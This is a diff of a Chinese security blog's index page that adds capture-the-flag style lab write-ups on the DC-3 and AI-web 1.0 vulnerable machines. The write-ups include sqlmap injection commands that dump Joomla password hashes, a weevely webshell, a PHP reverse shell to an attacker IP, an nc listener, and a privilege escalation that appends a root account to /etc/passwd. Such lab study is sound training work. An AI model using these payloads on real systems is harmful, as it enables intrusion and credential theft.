@@ -260,6 +260,309 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/31/dc-6-ba-ji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/31/dc-6-ba-ji/" itemprop="url">DC-6靶机</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-31T22:20:37+08:00">
+                2020-03-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/dc-3-ba-ji/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/12/dc-3-ba-ji/" itemprop="url">DC-3靶机</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T23:07:00+08:00">
+                2020-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="DC-3靶机学习"><a href="#DC-3靶机学习" class="headerlink" title="DC-3靶机学习"></a>DC-3靶机学习</h2><p>[TOC]</p>
+<h4 id="第一步、靶机安装与主机发现"><a href="#第一步、靶机安装与主机发现" class="headerlink" title="第一步、靶机安装与主机发现"></a>第一步、靶机安装与主机发现</h4><p>我们打开靶机，首先设置.nat连接，然后打开kali攻击机</p>
+<p>使用nmap进行二层主机发现</p>
+<pre><code>nmap -sn 192.168.153.1/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121855.png" alt=""></p>
+<h4 id="第二步、端口扫描与信息收集"><a href="#第二步、端口扫描与信息收集" class="headerlink" title="第二步、端口扫描与信息收集"></a>第二步、端口扫描与信息收集</h4><p>使用nmap进行简单的系统版本检测扫描。</p>
+<pre><code>nmap -sV 192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215121959.png" alt=""></p>
+<p>发现80端口开放且运行Apache服务。</p>
+<p>我们网页访问IP的80端口</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215122332.png" alt=""></p>
+<p>使用Wappalyzer进行指纹识别，发现使用的Joomla系统建站。</p>
+<h4 id="第三步、joomscan扫描"><a href="#第三步、joomscan扫描" class="headerlink" title="第三步、joomscan扫描"></a>第三步、joomscan扫描</h4><p>​        OWASPJoomla！漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。除此之外，OWASP JoomScan使用起来非常简单，不仅提供了非常友好的用户界面，而且还能够以HTML或文本格式导出扫描报告</p>
+<pre><code>  不知道为什么，我的kali里好像没有这个工具。。。</code></pre><p>我们从github上根据教程安装下载后。使用命令检测joomla的相关配置</p>
+<pre><code>perl joomscan.pl -u http://192.168.153.153</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215123552.png" alt=""></p>
+<p>我们得到了该Joomla的具体版本号为3.7.0.</p>
+<h4 id="第四步、searchsploit工具查找漏洞"><a href="#第四步、searchsploit工具查找漏洞" class="headerlink" title="第四步、searchsploit工具查找漏洞"></a>第四步、searchsploit工具查找漏洞</h4><p>使用searchsploit工具查找Joomla 3.7.0 版本存在的漏洞。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215123726.png" alt=""></p>
+<p>发现存在一个sql注入漏洞。</p>
+<p>我们将该漏洞文档复制到根目录下，然后打开。</p>
+<pre><code>cp /usr/share/exploitdb/exploits/php/webapps/42033.txt joomla-sql.txt
+cat joomla-sql.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124403.png" alt=""></p>
+<p>文档中给出了sqlmap自动注入的payload.</p>
+<h4 id="第五步、sqlmap自动注入"><a href="#第五步、sqlmap自动注入" class="headerlink" title="第五步、sqlmap自动注入"></a>第五步、sqlmap自动注入</h4><p>使用sqlmap自动注入工具对靶机执行sql注入代码。</p>
+<ul>
+<li>查询所有数据库：</li>
+</ul>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124833.png" alt=""></p>
+<p>查询当前使用数据库：</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]
+</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215124955.png" alt=""></p>
+<p>查询joomladb数据库下的表：</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; --tables  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125207.png" alt=""></p>
+<p>我们判断users表中应该有我们想要的账号密码，查询该表中的列：</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215125855.png" alt=""></p>
+<p>最后我们输出name,password的信息：</p>
+<pre><code>sqlmap  -u &quot;http://192.168.153.153/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;name,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215130011.png" alt=""></p>
+<h4 id="第六步、后台反弹getshell"><a href="#第六步、后台反弹getshell" class="headerlink" title="第六步、后台反弹getshell"></a>第六步、后台反弹getshell</h4><p>我们首先利用使用john爆破hash值：snoopy</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215130350.png" alt=""></p>
+<p>使用dirsearch扫出后台文件</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215133942.png" alt=""></p>
+<p>进入后台登录页面并登录</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134103.png" alt=""></p>
+<p>选择Templates模板，选择templates第一个模板即可，</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215134629.png" alt=""></p>
+<p>用weevely生成php后门文件.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142748.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215142836.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215144846.png" alt=""></p>
+<p>复制代码新建webshell.php文件，粘贴代码，保存</p>
+<p>然后用weevely连，成功拿到shell.</p>
+<h4 id="第七步、提权"><a href="#第七步、提权" class="headerlink" title="第七步、提权"></a>第七步、提权</h4><p>​    使用uname命令可知系统内核</p>
+<p>Ubuntu 16.04，我们可以尝试使用kali自带的earchsploit工具查找Ubuntu 16.04的提权漏洞。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215145305.png" alt=""></p>
+<p>我们将这个漏洞的详细文件复制到root根目录下，然后查看</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161711.png" alt=""></p>
+<p>我们将exp下载下来然后经过一系列的解压后</p>
+<pre><code>unzip 39772.zip 
+
+cd 39772
+
+tar -xvf exploit.tar  
+
+cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
+<p>​                ./doubleput</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200218161152.png" alt=""></p>
+<p>但是不知道为什么一直没法成功。。。。。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/duan-kou-shen-tou-zong-jie/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -823,6 +1126,201 @@
 <td><strong>爆破</strong> <strong>未授权访问</strong></td>
 </tr>
 </tbody></table>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/03/12/ai-web1-0-ba-ji-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/12/ai-web1-0-ba-ji-xue-xi/" itemprop="url">AI-web1.0靶机学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-12T22:37:46+08:00">
+                2020-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="AI-web-1-0靶机学习"><a href="#AI-web-1-0靶机学习" class="headerlink" title="AI-web 1.0靶机学习"></a>AI-web 1.0靶机学习</h2><h4 id="第一步、主机发现"><a href="#第一步、主机发现" class="headerlink" title="第一步、主机发现"></a>第一步、主机发现</h4><p>[TOC]</p>
+<p>我们尝试使用nmap的二层发现功能进行主机扫描</p>
+<pre><code>nmap -sn 192.168.153.0/24 </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185007.png" alt=""></p>
+<h4 id="第二步、端口扫描"><a href="#第二步、端口扫描" class="headerlink" title="第二步、端口扫描"></a>第二步、端口扫描</h4><p>我们初步确定靶机IP为192.168.153.135后，继续使用nmap进行端口扫描和信息收集。</p>
+<pre><code>nmap -A -p 1-65535 192.168.153.135 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185240.png" alt=""></p>
+<p>我们发现靶机的80端口上运行apache服务，并且发现了一个文件上传的目录</p>
+<p>我们尝试访问该ip的80端口,发现页面只有一句没什么用的话。。。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185640.png" alt=""></p>
+<h4 id="第三步、web信息收集"><a href="#第三步、web信息收集" class="headerlink" title="第三步、web信息收集"></a>第三步、web信息收集</h4><p>我们使用dirsearch工具尝试扫一下网站的目录。</p>
+<pre><code>dirb http://192.168.153.135</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206185739.png" alt=""></p>
+<p>发现目录下存在robots.txt文件，我们看看里面有没有什么敏感文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206185821.png" alt=""></p>
+<p>文件里给出了三个目录，我们依次进行访问，发现只有 /se3reTdir777/目录可以正常访问，发现是一个登陆点。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190345.png" alt=""></p>
+<p>我们输入任意数字，进行抓包判断，发现明显的注入点uid。使用sqlmap进行自动化扫描。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190358.png" alt=""></p>
+<h4 id="第四步、sqlmap自动化注入"><a href="#第四步、sqlmap自动化注入" class="headerlink" title="第四步、sqlmap自动化注入"></a>第四步、sqlmap自动化注入</h4><p>我们使用sqlmap进行自动化扫描。</p>
+<pre><code>python sqlmap.py -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;peration=Submit&quot; --dbs --batch</code></pre><p>得到了我们想要的数据库 aiweb1</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206190647.png" alt=""></p>
+<p>继续对目标数据库中的表进行探测</p>
+<pre><code>python sqlmap.py -u &quot;http:192.168.153.135/se3reTdir777/&quot;--data &quot;uid=1&amp;peration=Submit&quot; -D  aiweb1 --tables --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190733.png" alt=""></p>
+<p>探测字段</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  -D aiweb1 -T user --columns --batch</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200206190849.png" alt=""></p>
+<p>发现没有我们想要的信息。。。。。。只能换思路。</p>
+<h4 id="第五步、sqlmap反弹shell"><a href="#第五步、sqlmap反弹shell" class="headerlink" title="第五步、sqlmap反弹shell"></a>第五步、sqlmap反弹shell</h4><p>我们发现之前robots下存在一个 /m3diNf0/ 目录禁止访问，我们这里再次对其进行爆破。</p>
+<pre><code>dirb http://192.168.153.135/m3diNf0/ </code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215110747.png" alt=""></p>
+<p>我们发现目录下存在一个info.php，我们尝试对其进行访问。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200206192302.png" alt=""></p>
+<p>发现这是一个phpinfo配置页面。并且在其中发现了网站的根目录在home下。</p>
+<p>知道了网站的根目录，我们就可以尝试使用sqlmap反弹shell。</p>
+<pre><code>sqlmap -u &quot;http://192.168.153.135/se3reTdir777/&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --level=3 --os-shell</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200215112454.png" alt=""></p>
+<p>依次选择4:php web server</p>
+<p>​                2:custom location</p>
+<p>网站路径：/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</p>
+<p>​                PS：优先选择此路径的原因是sql注入在该页面下。</p>
+<h4 id="第六步、php后门反弹shell"><a href="#第六步、php后门反弹shell" class="headerlink" title="第六步、php后门反弹shell"></a>第六步、php后门反弹shell</h4><p>​    提示需要一个终端，所以我们得想办法反弹一个shell。在这里我们已经得到一个shell，可以写一个后门，在这里写一个php后门。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string">"192.168.153.152"</span><span class="token punctuation">,</span><span class="token number">4567</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/bin/sh -i &lt;&amp;3 >&amp;3 2>&amp;3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>我们尝试访问本地的127.0.0.1的4567端口。发现可以正常访问目录下的文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114220.png" alt=""></p>
+<p>我们在shell下载下a.php文件。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114406.png" alt=""></p>
+<p>我们在kali下监听 9966端口。</p>
+<pre><code>nc -lvp 9966</code></pre><p>然后我们在使用php命令运行我们下载的php后门。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215114646.png" alt=""></p>
+<p>我们可以发现kali已经成功反弹shell。</p>
+<h4 id="第七步、提权获得flag"><a href="#第七步、提权获得flag" class="headerlink" title="第七步、提权获得flag"></a>第七步、提权获得flag</h4><p>我们首先使用ptthon提升为交互式shell:</p>
+<pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>​    发现当前用户不是root用户但是这个用户可以对/etc/passwd 文件进行写入权限，所以我们试着添加一个用户看看： 因为写入的时候密码是加密的，所以要先加密密码:</p>
+<pre><code>openssl passwd -1 -salt abc 000000</code></pre><p>再写入密码：</p>
+<pre><code>echo &#39;abc&#39;:$1$abc$yzqAxwzjwao0BUFj9nRwF/:0:0::/root：/bin/bash&#39;&gt;&gt;/etc/passwd</code></pre><p>最后使用su命令切换为root用户。得到Flag.</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200215115210.png" alt=""></p>
+<p><strong>完</strong></p>
 
           
         
@@ -1569,6 +2067,28 @@
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -1918,7 +2438,7 @@ exit()</code></pre></li>
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1929,7 +2449,7 @@ exit()</code></pre></li>
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1940,7 +2460,7 @@ exit()</code></pre></li>
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
